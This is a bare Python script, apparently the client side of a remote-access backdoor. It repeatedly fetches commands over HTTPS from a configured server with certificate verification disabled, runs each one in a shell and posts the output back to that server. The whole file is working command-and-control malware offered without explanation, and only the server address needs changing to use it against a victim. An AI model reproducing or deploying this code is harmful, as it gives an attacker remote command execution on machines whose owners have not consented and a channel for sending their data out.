import urllib.request as request
from urllib import parse
import subprocess
import time
import ssl

server_ip = "127.0.0.1"
server_port = 8080
base_url = f'https://{server_ip}:{server_port}'

def send_post(data, endpoint='/'):
    data = parse.urlencode({"response": data}).encode()
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    request.urlopen(request.Request(f"{base_url}{endpoint}", data=data), context=ctx)

def run_command(command):
    process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    send_post(process.stdout.read() + process.stderr.read())

while True:
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    command = request.urlopen(base_url, context=ctx).read().decode().strip()
    run_command(command)
    time.sleep(1)
